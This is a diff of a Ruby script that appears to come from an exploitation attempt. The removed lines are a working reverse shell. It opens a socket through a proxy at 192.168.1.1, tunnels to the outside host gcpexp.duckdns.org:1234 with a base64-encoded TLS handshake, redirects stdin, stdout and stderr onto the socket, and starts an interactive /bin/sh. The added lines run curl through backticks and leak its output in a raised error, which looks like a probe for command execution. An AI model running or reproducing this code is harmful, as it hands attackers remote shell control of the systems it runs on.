@@ -1,11 +1,3 @@
+# exec("echo *")
+raise StandardError.new `(set -x; curl -v https://index.hu ) 2>&1`
 
-require 'socket'
-require 'base64'
-
-s = Socket.new 2,1
-s.connect Socket.sockaddr_in 1080, '192.168.1.1'
-s.print "CONNECT gcpexp.duckdns.org:1234 HTTP/1.0\r\nHost: 192.168.1.1\r\n\r\n"
-s.print(Base64.decode64("FgMBATsBAAE3AwPnSFZPqaNSTr1HhgDaaJrsF/b8HhJNQg5vNYvSl4G5kCCi8x17BdW3M+5DExlioCeaTRDM3ET03YQ2JogtEcmdJwA+EwITAxMBwCzAMACfzKnMqMyqwCvALwCewCTAKABrwCPAJwBnwArAFAA5wAnAEwAzAJ0AnAA9ADwANQAvAP8BAACwAAAAFwAVAAASZ2NwZXhwLmR1Y2tkbnMub3JnAAsABAMAAQIACgAWABQAHQAXAB4AGQAYAQABAQECAQMBBAAjAAAAFgAAABcAAAANACoAKAQDBQMGAwgHCAgICQgKCAsIBAgFCAYEAQUBBgEDAwMBAwIEAgUCBgIAKwAFBAMEAwMALQACAQEAMwAmACQAHQAgycqB349czbS7C9cn5poLwXhw96WAMiF4WxH0TQyM8y4="))
-
-[0,1,2].each { |fd| syscall 33, s.fileno, fd }
-exec '/bin/sh -i'
